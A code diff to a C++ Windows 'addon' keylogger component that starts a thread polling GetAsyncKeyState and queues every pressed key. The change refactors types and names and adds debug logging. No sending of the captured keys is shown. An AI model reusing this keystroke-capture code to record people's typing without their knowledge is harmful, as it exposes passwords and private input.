@@ -9,7 +9,7 @@ extern addonMutex* gMutex;
 extern addonKeylog* gKeylog;
 
 
-std::queue<char> keyQueue;
+std::queue<int> keyQueue;
 
 
 
@@ -17,7 +17,9 @@ std::queue<char> keyQueue;
 
 addonKeylog::addonKeylog()
 {
-	this->keylog_active = true;
+	addonDebug("Keylog constructor called");
+
+	this->active = true;
 
 	this->keylogHandle = gThread->Start((LPTHREAD_START_ROUTINE)keylog_thread);
 }
@@ -26,7 +28,9 @@ addonKeylog::addonKeylog()
 
 addonKeylog::~addonKeylog()
 {
-	this->keylog_active = false;
+	addonDebug("Keylog deconstructor called");
+
+	this->active = false;
 
 	gThread->Stop(this->keylogHandle);
 }
@@ -35,15 +39,17 @@ addonKeylog::~addonKeylog()
 
 DWORD _stdcall keylog_thread(LPVOID lpParam)
 {
-	while(gKeylog->keylog_active)
+	addonDebug("Thread 'keylog_thread' successfuly started");
+
+	while(gKeylog->active)
 	{
-		for(char q = 8; q != 191; q++)
+		for(int q = 8; q != 191; q++)
 		{
 			if(GetAsyncKeyState(q) == -32767)
 			{
-				gMutex->Lock();
+				gMutex->Lock(gMutex->mutexHandle);
 				keyQueue.push(q);
-				gMutex->unLock();
+				gMutex->unLock(gMutex->mutexHandle);
 			}
 		}
 
